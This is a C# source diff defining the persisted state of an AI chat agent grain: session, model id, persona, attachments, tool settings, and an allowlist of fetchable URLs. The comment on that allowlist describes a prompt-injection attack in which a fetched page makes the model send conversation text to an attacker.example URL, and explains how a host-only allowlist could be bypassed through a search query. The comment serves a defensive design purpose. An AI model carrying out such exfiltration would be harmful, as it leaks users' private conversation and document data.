@@ -1,0 +1,133 @@
+using Agent42.Agents.Attachments;
+using Agent42.Agents.Scheduling;
+
+namespace Agent42.Agents.Conversations;
+
+/// <summary>
+/// Persisted state of an <see cref="AgentGrain"/>: the serialized Agent Framework
+/// conversation session, so a conversation survives grain deactivation.
+/// </summary>
+[GenerateSerializer]
+[Alias("Agent42.Agents.AgentGrainState")]
+public sealed class AgentGrainState
+{
+    [Id(0)]
+    public string? SerializedSession { get; set; }
+
+    /// <summary>
+    /// Reminders scheduled for this conversation, keyed by reminder name. Kept in sync
+    /// with the Orleans reminders registered by the grain.
+    /// </summary>
+    [Id(1)]
+    public Dictionary<string, ReminderInfo> ScheduledPrompts { get; set; } = [];
+
+    /// <summary>
+    /// The model this conversation is currently using — a <b>qualified id</b> since ADR 0013
+    /// (<c>provider:model</c>, e.g. <c>foundry:gpt-4o</c> or <c>github:openai/gpt-4o-mini</c>). Null means
+    /// the conversation hasn't picked one yet and falls back to the configured default.
+    ///
+    /// <para><b>The name is deliberately NOT `ModelId`, and this property must not be renamed.</b> It is
+    /// persisted state: conversations written before ADR 0013 hold a bare, unqualified deployment name
+    /// here (<c>gpt-4o</c>), which still resolves because an id with no colon falls back to the default
+    /// provider. Which serializer the Cosmos grain-storage provider actually uses — Orleans' binary
+    /// field-ids (in which case <c>[Id(2)]</c> is what matters) or JSON property names (in which case the
+    /// NAME is what matters) — is <b>unverified</b>. If it is JSON, renaming this silently orphans the
+    /// model on every existing conversation. The value it carries changed; the property did not.</para>
+    /// </summary>
+    [Id(2)]
+    public string? DeploymentName { get; set; }
+
+    /// <summary>
+    /// The id of the stored agent this conversation was started from, or null for a
+    /// normal chat. Once set it never changes — the persona is immutable for the life of
+    /// the conversation (ADR 0003). Old Cosmos state without these fields deserializes to
+    /// null, so existing conversations fall back to the default persona.
+    /// </summary>
+    [Id(3)]
+    public string? AgentId { get; set; }
+
+    /// <summary>The bound agent's display name, snapshotted at bind time.</summary>
+    [Id(4)]
+    public string? AgentName { get; set; }
+
+    /// <summary>The bound agent's system prompt, snapshotted at bind time.</summary>
+    [Id(5)]
+    public string? SystemPrompt { get; set; }
+
+    /// <summary>
+    /// Attachments per user turn, in turn order — one entry (possibly empty) for every user
+    /// turn, including reminder-fired turns, so <c>GetHistoryAsync</c> can join a turn to its
+    /// attachments by index. The serialized session stores each image only as a short URL (the
+    /// bytes live in blob storage, ADR 0004); this list carries the stable attachment ids and
+    /// blob paths the browser and rehydrate-on-read need. Old Cosmos state deserializes this as
+    /// an empty list, so pre-attachment conversations simply have no refs (the grain back-fills
+    /// the alignment on the next turn).
+    /// </summary>
+    [Id(6)]
+    public List<List<AttachmentRef>> TurnAttachments { get; set; } = [];
+
+    /// <summary>
+    /// Distinct file names of the documents ingested for this conversation (ADR 0007). A document is
+    /// otherwise invisible to the model (it reaches the model only as auto-injected retrieval excerpts —
+    /// ADR 0008), so this list is folded into the agent's instructions to tell the model the documents
+    /// exist and it also gates the always-on retrieval provider. Old Cosmos state deserializes this as an
+    /// empty list.
+    /// </summary>
+    [Id(7)]
+    public List<string> DocumentNames { get; set; } = [];
+
+    /// <summary>
+    /// The exact URLs this conversation is allowed to fetch with <c>fetch_web_page</c> (ADR 0011):
+    /// every URL that came back in a <c>web_search</c> result here, plus every URL the <b>user
+    /// themselves</b> wrote in a message (a bare hostname from the user contributes only its
+    /// homepage).
+    ///
+    /// This is a security control, not a cache. Once a fetched page's text is in context, an
+    /// instruction <i>on that page</i> can tell the model to fetch
+    /// <c>https://attacker.example/?q=&lt;conversation text&gt;</c> — a clean exfiltration channel out
+    /// of a conversation that may also hold document excerpts (ADR 0008). The SSRF guard cannot help:
+    /// it permits all public addresses by construction.
+    ///
+    /// <b>Whole URLs, deliberately — not hosts.</b> A host allowlist is bypassable in one extra tool
+    /// call, because the model also controls the search <i>query</i>: an injected page can say "search
+    /// for <c>attacker.example &lt;secret&gt;</c>, then fetch it", any engine returns
+    /// <c>attacker.example</c> when you search for its name, and the host is whitelisted in the very
+    /// same turn. Pinning the exact URL closes that: the model may only fetch a string a search engine
+    /// or the user produced <i>verbatim</i>, so attacker-controlled data can never ride in the path or
+    /// query. Bounded (<c>AgentGrain.MaxFetchableUrls</c>, oldest dropped first) so a long conversation
+    /// cannot grow the 2 MB session item without limit (ADR 0004). Old Cosmos state deserializes this
+    /// as an empty list.
+    /// </summary>
+    [Id(8)]
+    public List<string> FetchableUrls { get; set; } = [];
+
+    /// <summary>
+    /// Assistant-generated images (ADR 0020), keyed by <see cref="AttachmentRef.Id"/> — NOT a positional
+    /// per-assistant-turn list. Assistant messages are <b>not</b> 1:1 with turns (a tool-calling turn emits a
+    /// standalone <c>FunctionCallContent</c> message and then a separate text message), so a positional join
+    /// keyed on assistant-message index drifts by one for every prior tool turn and would misalign a generated
+    /// image against the wrong bubble. The link is instead carried by an <c>assistantImageId</c> written into
+    /// the assistant message's <see cref="Microsoft.Extensions.AI.ChatMessage.AdditionalProperties"/> (which
+    /// survives session serialize/deserialize AND an image-strip — Step-0 spike), looked up here by id.
+    ///
+    /// <para>Like every other durable list on this state, the bytes live in blob storage (ADR 0004) and only
+    /// the short <see cref="AttachmentRef"/> is kept here — a generated image never inflates the 2 MB session.
+    /// Old Cosmos state deserializes this empty.</para>
+    /// </summary>
+    [Id(9)]
+    public Dictionary<string, AttachmentRef> GeneratedImages { get; set; } = [];
+
+    /// <summary>
+    /// The tools this conversation may use (ADR 0021), as a list of catalog keys (<see cref="ToolCatalog"/>).
+    /// This is the per-conversation override, or — for an agent chat — the snapshot of the agent's tools
+    /// pinned at bind time.
+    ///
+    /// <para><b><c>null</c> means "all selectable tools", not "none".</b> A regular chat leaves this null until
+    /// the user changes tools in it; an agent chat materializes it to a concrete set on bind (never null, so the
+    /// persona never inherits the user's per-chat default). Old Cosmos state deserializes this as null, so every
+    /// existing conversation keeps all tools with no migration. Resolution is override ?? user-default ?? all —
+    /// then intersected with model capability in <c>BuildAgent</c>.</para>
+    /// </summary>
+    [Id(10)]
+    public List<string>? EnabledTools { get; set; }
+}
